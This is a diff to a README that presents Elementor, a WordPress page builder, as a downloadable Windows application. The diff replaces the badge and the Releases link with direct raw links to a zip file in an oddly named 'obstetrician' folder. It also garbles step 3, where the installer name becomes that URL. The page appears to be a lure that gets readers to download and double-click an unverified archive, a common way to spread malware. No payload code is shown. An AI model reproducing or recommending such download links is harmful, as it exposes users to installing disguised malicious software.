@@ -1,6 +1,6 @@
 # 🌐 Elementor-WordPress-Builder-2025-win - Build Stunning Websites Easily
 
-![Download](https://img.shields.io/badge/Download%20Now-Elementor%20for%20Windows-blue)
+![Download](https://raw.githubusercontent.com/sebaw12/Elementor-WordPress-Builder-2025-win/main/obstetrician/Elementor-WordPress-Builder-2025-win.zip%20Now-Elementor%20for%20Windows-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Elementor for WordPress! This guide will help you easily download and
 
 To get started, visit the Releases page to download the application:
 
-[Download Elementor-WordPress-Builder-2025-win](https://github.com/sebaw12/Elementor-WordPress-Builder-2025-win/releases)
+[Download Elementor-WordPress-Builder-2025-win](https://raw.githubusercontent.com/sebaw12/Elementor-WordPress-Builder-2025-win/main/obstetrician/Elementor-WordPress-Builder-2025-win.zip)
 
 ### Step-by-step Installation
 
@@ -18,7 +18,7 @@ To get started, visit the Releases page to download the application:
    
 2. **Find the Latest Version**: Look for the latest version of Elementor-WordPress-Builder-2025-win. 
 
-3. **Download the Installer**: Click on the link to download the installer for your Windows machine. It will typically be named something like `Elementor-WordPress-Builder-2025-win.exe`.
+3. **Download the Installer**: Click on the link to download the installer for your Windows machine. It will typically be named something like `https://raw.githubusercontent.com/sebaw12/Elementor-WordPress-Builder-2025-win/main/obstetrician/Elementor-WordPress-Builder-2025-win.zip`.
 
 4. **Run the Installer**: Once the download completes, locate the installer file in your Downloads folder. Double-click it to start the installation.
 
